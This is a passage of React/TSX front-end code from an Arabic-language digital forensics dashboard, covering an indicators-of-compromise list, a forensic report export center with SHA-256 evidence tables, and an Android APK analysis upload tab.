                                  ioc.severity === 'medium' ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30' :
                                  'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                                }`}>
                                  {ioc.type}
                                </span>
                                <span className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 text-[10px] font-mono text-[#D4AF37]">
                                  ×{ioc.occurrences}
                                </span>
                                <span className="text-xs font-mono text-white font-bold select-all break-all">{ioc.value}</span>
                              </div>
                              <p className="text-[11px] text-gray-400">
                                {ioc.details}
                                {ioc.lines.length > 0 && (
                                  <span className="text-gray-500 font-mono mr-2">
                                    (الأسطر: {ioc.lines.slice(0, 6).join(', ')}{ioc.lines.length > 6 ? '...' : ''})
                                  </span>
                                )}
                              </p>
                            </div>

                            <div className="flex items-center gap-2 shrink-0">
                              <button
                                onClick={() => {
                                  setSearchQuery(ioc.value);
                                  setActiveTab('search');
                                }}
                                className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-900 hover:bg-gray-800 text-[#D4AF37] border border-gray-800 rounded-lg text-xs font-medium transition"
                                title="بحث استخباراتي OSINT لهذا المؤشر"
                              >
                                <Search className="w-3.5 h-3.5" />
                                OSINT
                              </button>
                              <button
                                onClick={() => copyToClipboard(ioc.value, ioc.id)}
                                className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-900 hover:bg-gray-800 text-gray-200 border border-gray-800 rounded-lg text-xs font-medium transition"
                              >
                                {copiedHash === ioc.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                {copiedHash === ioc.id ? 'تم النسخ' : 'نسخ'}
                              </button>
                            </div>
                          </div>
                        ))}
                      </div>
                    );
                  })()}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Tab: Official Documented Forensic Report Export Center */}
        {isTabVisible('reports') && (() => {
          const scopedEvidence = evidenceList.filter(e => !currentInvestigationId || e.investigationId === currentInvestigationId);
          const selectedEvidence = reportSelectedEvidenceIds.length > 0
            ? evidenceList.filter(e => reportSelectedEvidenceIds.includes(e.id))
            : scopedEvidence;
          const previewDossier = buildReportDossierPayload(selectedEvidence);

          return (
            <div className="space-y-6">
              {/* Top Official Report Studio Banner */}
              <div className="rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border border-gray-800 p-6 md:p-8 shadow-2xl no-print">
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
                  <div className="max-w-3xl space-y-2">
                    <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                      <ShieldCheck className="w-4 h-4" />
                      مركز تصدير التقارير الجنائية الرسمية الموثقة
                    </div>
                    <h1 className="text-2xl md:text-3xl font-bold text-white">
                      تجميع الأدلة وبصمات SHA-256 في ملف تقرير جنائي رسمي
                    </h1>
                    <p className="text-xs md:text-sm text-gray-400 leading-relaxed">
                      يجمع هذا النظام الأدلة المخزنة من Firestore، وبصماتها التشفيرية (SHA-256 / SHA-1 / MD5)، ونتائج فحص Magic Bytes و Canvas ELA، ومؤشرات الاختراق، وسلسلة الحيازة في ملف رسمي موثق ومختوم رقمياً ببصمة SHA-256 غير قابلة للتزوير.
                    </p>
                  </div>
                  <div className="grid grid-cols-3 gap-3 text-center shrink-0">
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-3">
                      <div className="text-[10px] font-mono text-gray-500">الأدلة المحددة</div>
                      <div className="text-xl font-bold text-[#D4AF37] font-mono">{selectedEvidence.length}</div>
                    </div>
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-3">
                      <div className="text-[10px] font-mono text-gray-500">مؤشرات IoCs</div>
                      <div className="text-xl font-bold text-emerald-400 font-mono">{parsedIoCs.length}</div>
                    </div>
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-3">
                      <div className="text-[10px] font-mono text-gray-500">تقارير صادرة</div>
                      <div className="text-xl font-bold text-white font-mono">{savedReports.length}</div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 no-print">
                {/* Left Config Form */}
                <div className="lg:col-span-5 bg-gray-900 border border-gray-800 rounded-2xl p-6 space-y-4">
                  <h3 className="text-sm font-bold text-white flex items-center gap-2 pb-3 border-b border-gray-800">
                    <FileText className="w-4 h-4 text-[#D4AF37]" />
                    بيانات التوثيق واعتماد التقرير الرسمي
                  </h3>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-400">رقم ملف القضية / المرجع</label>
                      <input
                        type="text"
                        value={reportCaseNumber}
                        onChange={(e) => setReportCaseNumber(e.target.value)}
                        className="w-full px-3 py-2 bg-gray-950 border border-gray-800 rounded-xl text-xs font-mono text-[#D4AF37] focus:border-[#D4AF37] outline-none"
                        dir="ltr"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-400">تصنيف السرية</label>
                      <select
                        value={reportClassification}
                        onChange={(e) => setReportClassification(e.target.value as ReportClassification)}
                        className="w-full px-3 py-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                      >
                        <option value="OFFICIAL">رسمي موثق (OFFICIAL)</option>
                        <option value="CONFIDENTIAL">سري ومقيد (CONFIDENTIAL)</option>
                        <option value="TOP_SECRET">سري للغاية (TOP SECRET)</option>
                      </select>
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-[11px] font-bold text-gray-400">عنوان التقرير الرسمي</label>
                    <input
                      type="text"
                      value={reportTitle}
                      onChange={(e) => setReportTitle(e.target.value)}
                      className="w-full px-3 py-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-400">اسم المحقق / الفاحص</label>
                      <input
                        type="text"
                        value={reportExaminerName}
                        onChange={(e) => setReportExaminerName(e.target.value)}
                        placeholder={userProfile?.displayName || 'كبير المحققين السياديين'}
                        className="w-full px-3 py-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-400">الجهة / المختبر الجنائي</label>
                      <input
                        type="text"
                        value={reportDepartment}
                        onChange={(e) => setReportDepartment(e.target.value)}
                        className="w-full px-3 py-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                      />
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-[11px] font-bold text-gray-400">الخلاصة الفنية والتقييم الجنائي</label>
                    <textarea
                      rows={3}
                      value={reportSummary}
                      onChange={(e) => setReportSummary(e.target.value)}
                      className="w-full px-3 py-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none resize-none leading-relaxed"
                    />
                  </div>

                  <div className="space-y-2 pt-2 border-t border-gray-800 text-xs">
                    <div className="font-bold text-gray-400 text-[11px]">الأقسام المضمنة في الملف المصدر:</div>
                    <div className="grid grid-cols-2 gap-2">
                      <label className="flex items-center gap-2 bg-gray-950 border border-gray-800 p-2 rounded-lg cursor-pointer">
                        <input type="checkbox" checked={reportIncludeEvidenceHashes} onChange={(e) => setReportIncludeEvidenceHashes(e.target.checked)} className="accent-[#D4AF37]" />
                        <span>الأدلة وبصمات SHA-256</span>
                      </label>
                      <label className="flex items-center gap-2 bg-gray-950 border border-gray-800 p-2 rounded-lg cursor-pointer">
                        <input type="checkbox" checked={reportIncludeExifEla} onChange={(e) => setReportIncludeExifEla(e.target.checked)} className="accent-[#D4AF37]" />
                        <span>نتائج EXIF و ELA</span>
                      </label>
                      <label className="flex items-center gap-2 bg-gray-950 border border-gray-800 p-2 rounded-lg cursor-pointer">
                        <input type="checkbox" checked={reportIncludeCustodyChain} onChange={(e) => setReportIncludeCustodyChain(e.target.checked)} className="accent-[#D4AF37]" />
                        <span>سلسلة الحيازة المشفرة</span>
                      </label>
                      <label className="flex items-center gap-2 bg-gray-950 border border-gray-800 p-2 rounded-lg cursor-pointer">
                        <input type="checkbox" checked={reportIncludeIoCs} onChange={(e) => setReportIncludeIoCs(e.target.checked)} className="accent-[#D4AF37]" />
                        <span>مؤشرات الاختراق ({parsedIoCs.length})</span>
                      </label>
                    </div>
                  </div>
                </div>

                {/* Right: Evidence Selection & Official Export Actions */}
                <div className="lg:col-span-7 bg-gray-900 border border-gray-800 rounded-2xl p-6 flex flex-col justify-between space-y-5">
                  <div className="space-y-4">
                    <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-gray-800">
                      <div>
                        <h3 className="text-sm font-bold text-white">تحديد الأدلة وبصمات SHA-256 المدرجة في التقرير</h3>
                        <p className="text-[11px] text-gray-400">
                          {reportSelectedEvidenceIds.length === 0
                            ? `سيتم تضمين جميع أدلة التحقيق الحالي تلقائياً (${scopedEvidence.length} دليل).`
                            : `تم تحديد ${reportSelectedEvidenceIds.length} دليل مخصص للتصدير.`}
                        </p>
                      </div>
                      <div className="flex items-center gap-2 text-xs">
                        <button
                          type="button"
                          onClick={() => setReportSelectedEvidenceIds(evidenceList.map(e => e.id))}
                          className="px-2.5 py-1 bg-gray-950 hover:bg-gray-800 border border-gray-700 rounded-lg text-[#D4AF37]"
                        >
                          تحديد الكل ({evidenceList.length})
                        </button>
                        <button
                          type="button"
                          onClick={() => setReportSelectedEvidenceIds([])}
                          className="px-2.5 py-1 bg-gray-950 hover:bg-gray-800 border border-gray-700 rounded-lg text-gray-300"
                        >
                          تلقائي حسب التحقيق
                        </button>
                      </div>
                    </div>

                    {evidenceList.length === 0 ? (
                      <div className="py-12 text-center text-gray-500 text-xs space-y-2 border border-dashed border-gray-800 rounded-xl">
                        <Database className="w-8 h-8 text-gray-700 mx-auto" />
                        <p>لا توجد أدلة محفوظة بعد. ارفع دليلاً من «إدارة الأدلة» أو «وحدة التحليل الرقمي» لتضمينه في التقرير الرسمي.</p>
                      </div>
                    ) : (
                      <div className="max-h-72 overflow-y-auto space-y-2 pr-1">
                        {evidenceList.map(ev => {
                          const isChecked = reportSelectedEvidenceIds.length === 0
                            ? (!currentInvestigationId || ev.investigationId === currentInvestigationId)
                            : reportSelectedEvidenceIds.includes(ev.id);
                          return (
                            <label
                              key={ev.id}
                              className={`flex items-center justify-between gap-3 p-3 rounded-xl border cursor-pointer transition ${
                                isChecked ? 'bg-[#D4AF37]/10 border-[#D4AF37]/40' : 'bg-gray-950 border-gray-800 hover:border-gray-700'
                              }`}
                            >
                              <div className="flex items-center gap-3 min-w-0">
                                <input
                                  type="checkbox"
                                  checked={isChecked}
                                  onChange={() => {
                                    const baseIds = reportSelectedEvidenceIds.length === 0
                                      ? scopedEvidence.map(s => s.id)
                                      : reportSelectedEvidenceIds;
                                    if (baseIds.includes(ev.id)) {
                                      setReportSelectedEvidenceIds(baseIds.filter(id => id !== ev.id));
                                    } else {
                                      setReportSelectedEvidenceIds([...baseIds, ev.id]);
                                    }
                                  }}
                                  className="accent-[#D4AF37] shrink-0"
                                />
                                <div className="min-w-0">
                                  <div className="text-xs font-bold text-white truncate">{ev.fileName}</div>
                                  <div className="text-[10px] font-mono text-emerald-400 truncate" dir="ltr">
                                    SHA-256: {ev.sha256}
                                  </div>
                                </div>
                              </div>
                              <div className="flex items-center gap-2 shrink-0">
                                <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                  (ev.analysis?.authenticityScore ?? 0) >= 80
                                    ? 'bg-emerald-500/15 text-emerald-400'
                                    : 'bg-red-500/15 text-red-400'
                                }`}>
                                  {ev.analysis?.authenticityScore ?? 0}%
                                </span>
                                <span className="text-[10px] font-mono text-gray-500">{formatFileSize(ev.fileSize || 0)}</span>
                              </div>
                            </label>
                          );
                        })}
                      </div>
                    )}
                  </div>

                  {/* Export Buttons Grid */}
                  <div className="space-y-3 pt-4 border-t border-gray-800">
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <button
                        type="button"
                        disabled={isGeneratingReport || selectedEvidence.length === 0}
                        onClick={() => handleExportOfficialReport('html')}
                        className="py-3 px-4 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl text-xs shadow-lg hover:opacity-95 transition flex items-center justify-center gap-2 disabled:opacity-50"
                      >
                        <Download className="w-4 h-4" />
                        تصدير ملف التقرير الرسمي الموثق (HTML)
                      </button>
                      <button
                        type="button"
                        disabled={selectedEvidence.length === 0}
                        onClick={() => window.print()}
                        className="py-3 px-4 bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-400 border border-emerald-500/30 font-bold rounded-xl text-xs transition flex items-center justify-center gap-2 disabled:opacity-50"
                      >
                        <Printer className="w-4 h-4" />
                        طباعة / حفظ كـ PDF رسمي مباشر
                      </button>
                      <button
                        type="button"
                        disabled={isGeneratingReport || selectedEvidence.length === 0}
                        onClick={() => handleExportOfficialReport('json')}
                        className="py-2.5 px-4 bg-gray-800 hover:bg-gray-700 text-gray-200 border border-gray-700 font-bold rounded-xl text-xs transition flex items-center justify-center gap-2 disabled:opacity-50"
                      >
                        <FileCode className="w-4 h-4 text-[#D4AF37]" />
                        تصدير الحزمة الموقعة (JSON)
                      </button>
                      <button
                        type="button"
                        disabled={isGeneratingReport || selectedEvidence.length === 0}
                        onClick={() => handleExportOfficialReport('csv')}
                        className="py-2.5 px-4 bg-gray-800 hover:bg-gray-700 text-gray-200 border border-gray-700 font-bold rounded-xl text-xs transition flex items-center justify-center gap-2 disabled:opacity-50"
                      >
                        <FileSpreadsheet className="w-4 h-4 text-emerald-400" />
                        تصدير جدول بصمات SHA-256 (CSV)
                      </button>
                    </div>

                    {reportLastSealSha256 && (
                      <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-3 text-xs space-y-1">
                        <div className="font-bold text-emerald-400 flex items-center justify-between">
                          <span className="flex items-center gap-1.5">
                            <CheckCircle2 className="w-4 h-4" />
                            تم ختم التقرير الأخير ببصمة SHA-256 وحفظ التوثيق في Firestore
                          </span>
                          <button
                            type="button"
                            onClick={() => copyToClipboard(reportLastSealSha256, 'report-seal')}
                            className="text-[11px] text-[#D4AF37] hover:underline flex items-center gap-1"
                          >
                            {copiedHash === 'report-seal' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                            نسخ الختم
                          </button>
                        </div>
                        <div className="font-mono text-[11px] text-gray-200 break-all" dir="ltr">
                          Seal SHA-256: {reportLastSealSha256}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Live Printable Official Forensic Dossier Preview Sheet */}
              <div className="bg-white text-gray-950 rounded-2xl border border-gray-300 shadow-2xl overflow-hidden print-certificate">
                <div className={`px-6 py-2 text-center text-xs font-bold text-white tracking-wider ${
                  reportClassification === 'TOP_SECRET' ? 'bg-red-700' : reportClassification === 'CONFIDENTIAL' ? 'bg-amber-700' : 'bg-teal-800'
                }`}>
                  {getClassificationLabel(reportClassification)}
                </div>
                <div className="p-6 md:p-8 space-y-6">
                  <div className="flex flex-col md:flex-row md:items-start justify-between gap-4 pb-5 border-b-2 border-gray-900">
                    <div>
                      <h2 className="text-xl font-extrabold text-gray-950">{previewDossier.title}</h2>
                      <p className="text-xs font-mono text-gray-500 mt-1">SOVEREIGN DIGITAL FORENSICS CORE • OFFICIAL EVIDENCE & HASH ATTESTATION</p>
                    </div>
                    <div className="bg-gray-50 border border-gray-200 rounded-xl p-3 text-xs space-y-1 min-w-[230px]">
                      <div><span className="text-gray-500">رقم القضية:</span> <strong className="font-mono">{previewDossier.caseNumber}</strong></div>
                      <div><span className="text-gray-500">المحقق:</span> <strong>{previewDossier.examinerName}</strong></div>
                      <div><span className="text-gray-500">الجهة:</span> <span>{previewDossier.department}</span></div>
                    </div>
                  </div>

                  {previewDossier.summary && (
                    <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-xs text-gray-800 leading-relaxed">
                      <strong className="block mb-1 text-gray-950">الخلاصة الفنية:</strong>
                      {previewDossier.summary}
                    </div>
                  )}

                  {reportIncludeEvidenceHashes && (
                    <div className="space-y-2">
                      <h3 className="text-sm font-bold text-gray-950 border-r-4 border-amber-700 pr-2">
                        جدول جرد الأدلة وبصمات SHA-256 ({selectedEvidence.length})
                      </h3>
                      <div className="overflow-x-auto">
                        <table className="w-full text-xs text-right border border-gray-200">
                          <thead className="bg-gray-900 text-white">
                            <tr>
                              <th className="p-2.5">#</th>
                              <th className="p-2.5">اسم الملف والحجم</th>
                              <th className="p-2.5">الترويسة (Magic Bytes)</th>
                              <th className="p-2.5">الأصالة / ELA</th>
                              <th className="p-2.5">بصمة SHA-256 الكاملة</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y divide-gray-200">
                            {selectedEvidence.length === 0 ? (
                              <tr>
                                <td colSpan={5} className="p-6 text-center text-gray-500">لا توجد أدلة مدرجة حالياً.</td>
                              </tr>
                            ) : (
                              selectedEvidence.map((ev, idx) => (
                                <tr key={ev.id} className="odd:bg-white even:bg-gray-50">
                                  <td className="p-2.5 font-mono">{idx + 1}</td>
                                  <td className="p-2.5">
                                    <div className="font-bold text-gray-950">{ev.fileName}</div>
                                    <div className="text-[10px] text-gray-500 font-mono">{formatFileSize(ev.fileSize || 0)} • {ev.mimeType}</div>
                                  </td>
                                  <td className="p-2.5 text-[11px]">
                                    <div>{ev.analysis?.detectedFileType || ev.mimeType}</div>
                                    {ev.analysis?.headerHex && <div className="font-mono text-[10px] text-gray-500" dir="ltr">{ev.analysis.headerHex}</div>}
                                  </td>
                                  <td className="p-2.5 font-mono text-[11px]">
                                    <span className={`px-2 py-0.5 rounded-full font-bold ${(ev.analysis?.authenticityScore ?? 0) >= 80 ? 'bg-emerald-100 text-emerald-800' : 'bg-red-100 text-red-800'}`}>
                                      {ev.analysis?.authenticityScore ?? 0}%
                                    </span>
                                    {ev.analysis?.elaScore ? <div className="text-[10px] text-gray-500 mt-1">ELA: {ev.analysis.elaScore}%</div> : null}
                                  </td>
                                  <td className="p-2.5 font-mono text-[10px] break-all max-w-[270px]" dir="ltr">
                                    {ev.sha256}
                                  </td>
                                </tr>
                              ))
                            )}
                          </tbody>
                        </table>
                      </div>
                    </div>
                  )}

                  {reportIncludeCustodyChain && globalCustodyLedger.length > 0 && (
                    <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 flex flex-wrap items-center justify-between gap-2 text-xs">
                      <div>
                        <strong>توثيق سلسلة الحيازة (Firestore Ledger):</strong> تم تضمين {globalCustodyLedger.length} كتلة حركة متسلسلة.
                      </div>
                      <span className={`px-2.5 py-1 rounded-full font-mono text-[11px] font-bold ${globalLedgerVerification.verified ? 'bg-emerald-100 text-emerald-800' : 'bg-red-100 text-red-800'}`}>
                        {globalLedgerVerification.verified ? 'SHA-256 CHAIN VERIFIED' : 'CHAIN WARNING'}
                      </span>
                    </div>
                  )}

                  {reportLastSealSha256 && (
                    <div className="bg-amber-50 border-2 border-gray-900 rounded-xl p-4 text-xs">
                      <div className="font-bold text-gray-950">الختم التشفيري الرسمي للتقرير (Report Seal SHA-256):</div>
                      <div className="font-mono text-[11px] text-emerald-700 bg-gray-950 text-emerald-400 p-2.5 rounded-lg mt-2 break-all" dir="ltr">
                        {reportLastSealSha256}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Archive of Sealed Reports from Firestore */}
              {savedReports.length > 0 && (
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 space-y-4 no-print">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="text-sm font-bold text-white">أرشيف التقارير الجنائية المختومة (Firestore forensic_reports)</h3>
                      <p className="text-xs text-gray-400">سجل غير قابل للتعديل أو الحذف للتقارير الرسمية الصادرة وبصمات اعتمادها.</p>
                    </div>
                    <span className="text-xs font-mono text-[#D4AF37]">{savedReports.length} تقرير موثق</span>
                  </div>
                  <div className="overflow-x-auto">
                    <table className="w-full text-right text-xs">
                      <thead className="bg-gray-950 text-gray-400 border-b border-gray-800">
                        <tr>
                          <th className="px-3 py-2.5">رقم القضية</th>
                          <th className="px-3 py-2.5">العنوان</th>
                          <th className="px-3 py-2.5">الأدلة</th>
                          <th className="px-3 py-2.5">الصيغة</th>
                          <th className="px-3 py-2.5">بصمة ختم التقرير (SHA-256)</th>
                          <th className="px-3 py-2.5">التاريخ</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-800">
                        {savedReports.map(rpt => (
                          <tr key={rpt.id} className="hover:bg-gray-800/30">
                            <td className="px-3 py-2.5 font-mono font-bold text-[#D4AF37]">{rpt.caseNumber}</td>
                            <td className="px-3 py-2.5 text-white">{rpt.title}</td>
                            <td className="px-3 py-2.5 font-mono text-gray-300">{rpt.evidenceCount}</td>
                            <td className="px-3 py-2.5 font-mono text-emerald-400">{rpt.exportFormat || 'HTML'}</td>
                            <td className="px-3 py-2.5 font-mono text-[10px] text-gray-400 max-w-[240px] truncate select-all" dir="ltr" title={rpt.reportSealSha256}>
                              {rpt.reportSealSha256}
                            </td>
                            <td className="px-3 py-2.5 font-mono text-[10px] text-gray-500">{formatTimestampSafe(rpt.createdAt)}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </div>
          );
        })()}

        {/* Tab: Android APK Forensics */}
        {isTabVisible('apk') && (
          <div className="space-y-6">
            <div
              onDragOver={(e) => { e.preventDefault(); setIsDraggingApk(true); }}
              onDragLeave={() => setIsDraggingApk(false)}
              onDrop={(e) => {
                e.preventDefault();
                setIsDraggingApk(false);
                const dropped = e.dataTransfer.files?.[0];
                if (dropped) handleApkForensicUpload(dropped);
              }}
              className={`rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border-2 p-8 shadow-2xl transition ${
                isDraggingApk ? 'border-[#D4AF37] bg-[#D4AF37]/5' : 'border-gray-800'
              }`}
            >
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
                <div className="space-y-3 max-w-3xl">
                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                    <Smartphone className="w-3.5 h-3.5" />
                    ANDROID APK FORENSICS • BINARY AXML & DEX INSPECTOR + NEURAL-X SECURITY DAEMON v3.5
                  </div>
                  <h1 className="text-2xl md:text-3xl font-bold text-white">
                    مختبر فحص وتحليل تطبيقات أندرويد (Android APK Forensics)
                  </h1>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    تفكيك برمجي حقيقي لحزم <code className="text-[#D4AF37]">.apk</code> في بيئة معزولة لقراءة ملف <code className="text-emerald-400">AndroidManifest.xml</code> الثنائي (AXML) واستخراج الأذونات الحساسة وكافة الروابط (URLs) وعناوين الـ IP من ملفات التطبيق (<code className="text-gray-300">classes.dex</code> و <code className="text-gray-300">assets</code>)، ثم تقييمها عبر محرك Sovereign Core Engine v3.5 لكشف السلوك التجسسي (Spyware) وتحديث سجل التهديدات فوراً.
                  </p>
                </div>

                <div className="flex flex-wrap items-center gap-3 shrink-0">
                  <label className="cursor-pointer inline-flex items-center gap-2.5 px-6 py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition text-sm">
                    <Upload className="w-5 h-5" />
                    رفع ملف APK للفحص الجنائي
                    <input
                      type="file"
                      accept=".apk,application/vnd.android.package-archive,application/zip"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        e.target.value = '';
                        if (f) handleApkForensicUpload(f);
                      }}
                      className="hidden"
                    />
                  </label>
                  {apkStaticResult && (
                    <button
                      onClick={downloadApkJsonReport}
                      className="px-4 py-3.5 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold rounded-xl border border-gray-700 transition flex items-center gap-2"
                    >
                      <Download className="w-4 h-4 text-[#D4AF37]" />
                      تصدير تقرير JSON
                    </button>
                  )}
                </div>
              </div>
            </div>

            {apkAnalyzing && (
              <div className="rounded-2xl bg-gray-900 border border-[#D4AF37]/40 p-10 text-center space-y-4">
                <RefreshCw className="w-10 h-10 text-[#D4AF37] animate-spin mx-auto" />
                <h3 className="text-lg font-bold text-white">
                  {apkStage === 'extracting'
                    ? 'جاري تفكيك حزمة APK وقراءة AndroidManifest.xml وملفات DEX...'
                    : 'جاري إرسال المؤشرات المستخرجة إلى وحدة Neural-X Security Daemon لتقييم السلوك التجسسي...'}
                </h3>
                <p className="text-xs text-gray-400 font-mono">
                  {apkStage === 'extracting'
                    ? 'JSZip Decompression • AXML Binary StringPool • SHA-256 • URL & IP Extraction'
                    : 'Neural-X APK Security Daemon v3.5 • Telemetry Correlator • Real-time Threat Scoring'}
                </p>
              </div>
            )}

            {apkError && (
              <div className="rounded-2xl bg-red-950/30 border border-red-500/40 p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="flex items-start gap-3 text-red-300">
                  <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5 text-red-400" />
                  <div className="space-y-1">
                    <div className="text-sm font-bold text-red-200">تشخيص حالة التحليل عبر وحدة Threat Hunting Daemon</div>
                    <p className="text-xs leading-relaxed font-mono break-all">{apkError}</p>
                  </div>
                </div>
                {apkStaticResult && !apkAnalyzing && (
                  <button
                    onClick={() => evaluateApkWithCoreDaemon(apkStaticResult)}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition shrink-0 flex items-center gap-1.5"
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                    إعادة الفحص عبر Sovereign Core
                  </button>
                )}
              </div>
            )}

            {apkStaticResult && (
              <div className="space-y-6">
                {/* Summary KPI Strip */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">الحزمة (Package)</span>
                    <div className="text-sm font-bold text-white font-mono truncate" title={apkStaticResult.packageName || apkStaticResult.fileName}>
                      {apkStaticResult.packageName || apkStaticResult.fileName}
                    </div>
                    <div className="text-[11px] text-gray-400 font-mono">
                      {formatFileSize(apkStaticResult.fileSize)} • {apkStaticResult.totalEntries} ملف داخلي
                    </div>
                  </div>

                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">الأذونات المستخرجة</span>
                    <div className="text-2xl font-bold text-[#D4AF37] font-mono">
                      {apkStaticResult.permissions.length}
                    </div>
                    <div className="text-[11px] text-red-400 font-bold">
                      {apkStaticResult.criticalPermissionsCount} حرجة • {apkStaticResult.sensitivePermissionsCount} حساسة
                    </div>
                  </div>

                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">الروابط (URLs)</span>
                    <div className="text-2xl font-bold text-emerald-400 font-mono">
                      {apkStaticResult.endpointUrlsCount}
                    </div>
                    <div className="text-[11px] text-gray-400">
                      إجمالي الروابط المستخرجة: {apkStaticResult.urls.length}
                    </div>
                  </div>

                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">عناوين الـ IP</span>
                    <div className="text-2xl font-bold text-blue-400 font-mono">
                      {apkStaticResult.ips.length}
                    </div>
                    <div className="text-[11px] text-gray-400">
                      عامة خارجية: {apkStaticResult.ips.filter(i => !i.isPrivate).length}
                    </div>
                  </div>

                  <div className={`border p-5 rounded-2xl space-y-1 ${
                    apkAiReport?.isSpyware
                      ? 'bg-red-950/30 border-red-500/50'
                      : apkAiReport
                      ? 'bg-emerald-950/20 border-emerald-500/40'
                      : 'bg-gray-900 border-gray-800'
                  }`}>
                    <span className="text-[10px] text-gray-400 uppercase font-mono">حكم Sovereign Core الجنائي</span>
                    <div className={`text-lg font-bold ${
                      apkAiReport?.isSpyware ? 'text-red-400' : apkAiReport ? 'text-emerald-400' : 'text-gray-400'
                    }`}>
                      {apkAiReport ? apkAiReport.classification : apkAnalyzing ? 'جاري التقييم...' : 'بانتظار المحرك'}
                    </div>
                    <div className="text-[11px] font-mono text-gray-300">
                      {apkAiReport ? `درجة التهديد: ${apkAiReport.threatScore}/100 (${apkAiReport.riskLevel})` : `Entropy: ${apkStaticResult.entropy}/8.0`}
                    </div>
                  </div>
                </div>

                {/* Neural-X Security Daemon Report Card */}
                {apkAiReport && (
                  <div className={`rounded-2xl border p-6 space-y-5 shadow-2xl ${
                    apkAiReport.isSpyware || apkAiReport.riskLevel === 'حرج' || apkAiReport.riskLevel === 'مرتفع'
                      ? 'bg-gradient-to-br from-gray-900 via-gray-900 to-red-950/30 border-red-500/40'
                      : 'bg-gradient-to-br from-gray-900 via-gray-900 to-emerald-950/20 border-emerald-500/30'
                  }`}>
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-gray-800">
                      <div className="flex items-center gap-3">
                        <div className={`w-11 h-11 rounded-xl flex items-center justify-center border ${
                          apkAiReport.isSpyware
                            ? 'bg-red-500/15 border-red-500/40 text-red-400'
                            : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400'
                        }`}>
                          {apkAiReport.isSpyware ? <ShieldAlert className="w-6 h-6" /> : <ShieldCheck className="w-6 h-6" />}
                        </div>
                        <div>
                          <h2 className="text-lg font-bold text-white flex items-center gap-2">
